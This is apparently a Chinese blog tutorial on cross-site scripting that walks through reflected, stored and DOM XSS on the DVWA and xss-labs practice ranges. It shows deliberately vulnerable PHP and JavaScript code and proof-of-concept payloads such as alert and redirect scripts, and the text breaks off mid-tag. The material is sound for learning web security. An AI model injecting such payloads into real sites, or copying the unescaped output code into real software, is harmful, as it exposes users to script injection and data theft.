{"blogid": "123286723", "writerAge": "码龄8年", "writerBlogNum": "44", "writerCollect": "73", "writerComment": "5", "writerFan": "39", "writerGrade": "3级", "writerIntegral": "534", "writerName": "灰球球", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_123286723.jpg", "writerRankTotal": "35364", "writerRankWeekly": "283945", "writerThumb": "41", "writerVisitNum": "51598", "blog_read_count": "2577", "blog_time": "已于 2022-03-06 21:52:06 修改", "blog_title": "XSS攻击", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"XSS_0\"></a>XSS攻击</h1>\n<p></p>\n<div class=\"toc\">\n<h3>content</h3>\n<ul><li><a href=\"#XSS_0\">XSS攻击</a></li><li><ul><li><a href=\"#xss_9\">什么是xss攻击?</a></li><li><ul><li><a href=\"#indexhtml_13\">index.html</a></li><li><a href=\"#indexphp_35\">index.php</a></li><li><a href=\"#_85\">反射型</a></li><li><ul><li><a href=\"#DVWA_lowxssReflected_87\">DVWA靶场 low等级xss(Reflected)</a></li><li><a href=\"#xsslabs_level1_107\">xss-labs level1</a></li></ul>\n</li><li><a href=\"#_123\">存储型</a></li><li><ul><li><a href=\"#DVWAlowXssstored_127\">DVWA靶场low等级Xss(stored)</a></li></ul>\n</li><li><a href=\"#DOM_171\">DOM型</a></li><li><ul><li><a href=\"#DVWAlowXssdom_173\">DVWA靶场low等级Xss(dom)</a></li></ul>\n</li></ul>\n</li><li><a href=\"#_292\">绕过方法</a></li><li><ul><li><a href=\"#_294\">使用事件</a></li><li><ul><li><a href=\"#DVWAmediumXssReflected_296\">DVWA靶场medium等级Xss(Reflected)</a></li></ul>\n</li><li><a href=\"#_337\">闭合标签</a></li><li><ul><li><a href=\"#xsslabslevel2_339\">xss-labs靶场level2</a></li></ul>\n</li><li><a href=\"#htmlspecialchars_438\">闭合引号,绕过htmlspecialchars()函数</a></li><li><ul><li><a href=\"#xsslabslevel3_440\">xss-labs靶场level3</a></li><li><a href=\"#xsslabslevel4_530\">xss-labs靶场level4</a></li></ul>\n</li><li><a href=\"#scripton_569\">绕过对`script`和`on`的替换</a></li><li><ul><li><a href=\"#xsslabslevel5_571\">xss-labs靶场level5</a></li></ul>\n</li><li><a href=\"#_650\">大小写绕过</a></li><li><ul><li><a href=\"#xsslabslevel5_652\">修改xss-labs靶场level5</a></li><li><a href=\"#xsslabslevel6_664\">xss-labs靶场level6</a></li></ul>\n</li><li><a href=\"#_690\">双写绕过</a></li><li><ul><li><a href=\"#xsslabslevel7_692\">xss-labs靶场level7</a></li></ul>\n</li><li><a href=\"#HTML_728\">HTML实体绕过</a></li><li><ul><li><a href=\"#xsslabslevel8_730\">xss-labs靶场level8</a></li></ul>\n</li></ul>\n</li></ul>\n</li></ul>\n</div>\n<p></p>\n<p>xss全称Cross Site Scripting跨站脚本</p>\n<h2><a id=\"xss_9\"></a>什么是xss攻击?</h2>\n<p>一个前端的html是这样写的:</p>\n<h3><a id=\"indexhtml_13\"></a>index.html</h3>\n<pre><code class=\"prism language-html\"><span class=\"token doctype\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>testXSS<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>index.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>get<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>xss_input<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre>\n<p>作用是提交一个表单,填写的text以xss_input句柄,使用get方法传递给后端index.php</p>\n<p><img alt=\"image-20220304101719946\" src=\"..\\..\\static\\image\\2135d7594214716b7782574894a45f3a.png\"/></p>\n<h3><a id=\"indexphp_35\"></a>index.php</h3>\n<p>后端是这样写的</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$xss</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'xss_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"input is \"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$xss</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>作用是将前端传过来的text回显</p>\n<p>比如前端text框里写123则回显input is 123 到html页面</p>\n<p>但是,text框里没有限定能够写啥,可以写123,也可以写abc,更可以写javascript脚本.</p>\n<p>并且如果写入可执行的js脚本,则会被浏览器执行</p>\n<p>比如写<code>&lt;script&gt;alert(\"helloworld\")&lt;/script&gt;</code>,点击submit之后</p>\n<p><img alt=\"image-20220304102417523\" src=\"..\\..\\static\\image\\81c1de5ea0c63e9bb961fa21e45e25c5.png\"/></p>\n<p>发现js脚本运行了</p>\n<p>如果想通过写入js脚本跳转到其他网页?</p>\n<pre><code>&lt;script&gt;window.location.href = 'http://baidu.com'&lt;/script&gt;\n</code></pre>\n<p>点击之后会跳转到baidu.com</p>\n<p>为什么以能够执行js脚本为标准判断是否存在xss漏洞?</p>\n<p>或者说通过执行js脚本可以干啥?</p>\n<p>啥都可以干.</p>\n<p>比如存储式xss攻击中,攻击者可以在一个大家都可以看到的消息处写一个xss攻击.导致每个能够看到该位置的用户浏览器都会自动执行攻击者输入的脚本</p>\n<p>由于<code>&lt;script&gt;这中间可以写任意长的js脚本&lt;/script&gt;</code>,攻击者完全可以写一个脚本程序获取用户的信息,然后将信息发往自己能够接收的位置</p>\n<h3><a id=\"_85\"></a>反射型</h3>\n<h4><a id=\"DVWA_lowxssReflected_87\"></a>DVWA靶场 low等级xss(Reflected)</h4>\n<p>后端代码:</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\nheader <span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"X-XSS-Protection: 0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Is there any input?</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">array_key_exists</span><span class=\"token punctuation\">(</span> <span class=\"token double-quoted-string string\">\"name\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token single-quoted-string string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">NULL</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token comment\">// Feedback for end user</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'&lt;pre&gt;Hello '</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token single-quoted-string string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">.</span> <span class=\"token single-quoted-string string\">'&lt;/pre&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter important\">?&gt;</span> \n</code></pre>\n<p>第5行只是判断了前端有没有通过get传过一个name变量来,并且name变量是否为空,没有过滤name的内容,是存在xss漏洞的</p>\n<h4><a id=\"xsslabs_level1_107\"></a>xss-labs level1</h4>\n<p><img alt=\"image-20220304105313051\" src=\"..\\..\\static\\image\\0847214274a49c15d23a1ac0667799be.png\"/></p>\n<p>注意\"<strong>payload的长度:4</strong>\",观察域名中的get请求,name=test,其中test正好长度为4,改成12345</p>\n<p><img alt=\"image-20220304105501758\" src=\"..\\..\\static\\image\\5c21cbc6928af58c28a32976fb77e70b.png\"/></p>\n<p>那么可以判定回显位置有\"<strong>欢迎用户</strong>\"和\"<strong>payload的长度</strong>\"</p>\n<p>将name值改写为xss攻击语句</p>\n<p><img alt=\"image-20220304105627683\" src=\"..\\..\\static\\image\\d758cf9855bdffb9733dffa8def1884a.png\"/></p>\n<h3><a id=\"_123\"></a>存储型</h3>\n<p>存储型的意思是通过将不合法的输入上传到服务端数据库,使得每次打开相应页面都会遭到xss攻击</p>\n<h4><a id=\"DVWAlowXssstored_127\"></a>DVWA靶场low等级Xss(stored)</h4>\n<p><img alt=\"image-20220304103847870\" src=\"..\\..\\static\\image\\983ea0435a8d81713d977a196d48965c.png\"/></p>\n<p>这里message框里写入xss攻击代码<img alt=\"image-20220304103927492\" src=\"..\\..\\static\\image\\c42d101b8570f1b91b617f5d245c6846.png\"/></p>\n<p>然后sign guestbook会立刻弹出警告框,并且可以看到表单下方已经存在了一条Name=1的记录,其Message为空</p>\n<p><img alt=\"image-20220304104018510\" src=\"..\\..\\static\\image\\07751e708994d299d1781eb2e3cd2839.png\"/></p>\n<p>然后更换到其他靶场再换回Xss(stored)靶场仍然会弹出该警告框,即xss攻击是持久性的,如果后端不主动删除数据库中恶意的记录,xss攻击将会永远存在</p>\n<p>后端代码:</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token single-quoted-string string\">'btnSign'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token comment\">// Get input</span>\n    <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token single-quoted-string string\">'mtxMessage'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//去掉字符串中的空格</span>\n    <span class=\"token variable\">$name</span>    <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token single-quoted-string string\">'txtName'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Sanitize message input</span>\n    <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//删除反斜杠\\,注意和/区别</span>\n    <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token double-quoted-string string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//mysqli_real_escape_string的作用是:转义字符,方便sql查询</span>\n    <span class=\"token comment\">// Sanitize name input</span>\n    <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$name</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token double-quoted-string string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Update database</span>\n    <span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class=\"token interpolation\"><span class=\"token variable\">$message</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>' );\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//$query向guestbook数据表中插入了一个comment=$message,name=$name的记录</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token single-quoted-string string\">'&lt;pre&gt;'</span> <span class=\"token punctuation\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token single-quoted-string string\">'&lt;/pre&gt;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//mysql_close();</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter important\">?&gt;</span> \n</code></pre>\n<h3><a id=\"DOM_171\"></a>DOM型</h3>\n<h4><a id=\"DVWAlowXssdom_173\"></a>DVWA靶场low等级Xss(dom)</h4>\n<p><img alt=\"image-20220304105855810\" src=\"..\\..\\static\\image\\6e6ef53b04ed669584a4d006a1a69dff.png\"/></p>\n<p>选一个英语然后点击Select,域名行会变成:</p>\n<pre><code>http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English\n</code></pre>\n<p>根据反射型xss的情况,猜测default=English这里English有问题,将Englist改成xss语句</p>\n<pre><code>http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(0)&lt;/script&gt;\n</code></pre>\n<p><img alt=\"image-20220304110151139\" src=\"..\\..\\static\\image\\a161a7c677729ff994f7c57dc764892f.png\"/></p>\n<p>发现成功了</p>\n<p>查看前端代码</p>\n<pre><code class=\"prism language-js\"><span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"vulnerable_code_area\"</span><span class=\"token operator\">&gt;</span>\n \n \t\t<span class=\"token operator\">&lt;</span>p<span class=\"token operator\">&gt;</span>Please choose a language<span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>p<span class=\"token operator\">&gt;</span>\n\n\t\t<span class=\"token operator\">&lt;</span>form name<span class=\"token operator\">=</span><span class=\"token string\">\"XSS\"</span> method<span class=\"token operator\">=</span><span class=\"token string\">\"GET\"</span><span class=\"token operator\">&gt;</span><span class=\"token comment\">//表单使用GET方法提交</span>\n\t\t\t<span class=\"token operator\">&lt;</span>select name<span class=\"token operator\">=</span><span class=\"token string\">\"default\"</span><span class=\"token operator\">&gt;</span><span class=\"token comment\">//键为default</span>\n\t\t\t\t<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">&gt;</span>\n\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"default=\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\t\t\t\t\t\t<span class=\"token keyword\">var</span> lang <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"default=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='\"</span> <span class=\"token operator\">+</span> lang <span class=\"token operator\">+</span> <span class=\"token string\">\"'&gt;\"</span> <span class=\"token operator\">+</span> <span class=\"token function\">decodeURI</span><span class=\"token punctuation\">(</span>lang<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t\t\t    \n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='English'&gt;English&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='French'&gt;French&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='German'&gt;German&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n\t\t\t<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>select<span class=\"token operator\">&gt;</span>\n\t\t\t<span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string\">\"Select\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span><span class=\"token comment\">//通过点击Select提交</span>\n\t\t<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n\t<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>分析这个选择框都有什么行为?</p>\n<pre><code class=\"prism language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"default=\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">var</span> lang <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"default=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='\"</span> <span class=\"token operator\">+</span> lang <span class=\"token operator\">+</span> <span class=\"token string\">\"'&gt;\"</span> <span class=\"token operator\">+</span> <span class=\"token function\">decodeURI</span><span class=\"token punctuation\">(</span>lang<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<blockquote>\n<p><strong>document</strong></p>\n<p>每个载入浏览器的 HTML 文档都会成为 Document 对象。</p>\n<p>Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。</p>\n<p><strong>location</strong></p>\n<p><strong><code>Document.location</code></strong> 是一个只读属性，返回一个 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Location\"><code>Location</code></a> 对象，包含有文档的 <mark>URL 相关</mark>的信息，并提供了改变该 URL 和加载其他 URL 的方法。</p>\n<p>那么<code>document.location.href.indexOf(\"default=\") &gt;= 0</code>的作用是判断url中是否存在\"default=\"字样</p>\n<p>如果存在则执行if语句中的逻辑:</p>\n<p><strong><code>var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8);</code></strong></p>\n<p>default=正好长度为8,那么 lang就是url中default=之后的字串</p>\n<p>substring的参数有两个,起始位置和字串长度,如果只指定起始位置,缺省子串长度,则取从起始位置到末尾的所有内容作为字串</p>\n<p>可以认为lang取的是键值对中的值</p>\n<p><strong><code>document.write(\"&lt;option value='\" + lang + \"'&gt;\" + decodeURI(lang) + \"&lt;/option&gt;\");</code></strong></p>\n<p>option标签是配合select标签使用的,select表明下拉框,每一个option是下拉框中的一个选项</p>\n<p>decodeURI的作用是将转码之后的URI再还原.</p>\n<p>比如<code>default=&lt;script&gt;alert(0)&lt;/script&gt;</code>转码后:<code>default=%3Cscript%3Ealert(0)%3C/script%3E</code></p>\n<p>对转码后的字符串使用decodeURI可以回到<code>default=&lt;script&gt;alert(0)&lt;/script&gt;</code></p>\n<p><strong><code>document.write(\"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;\");</code></strong></p>\n<p>该条选项只能显示不能被选择(disabled),显示内容是四个横线,起分割线的作用</p>\n</blockquote>\n<p>综上,前端的作用是显示一个选项框,当我们首次到达该页面,没有做任何选择的时候,</p>\n<p>URL中没有default=…的字样,if条件不成立,下拉框只会顺次显示English,Franch,Spanish,German四个选项</p>\n<p><img alt=\"image-20220304113015619\" 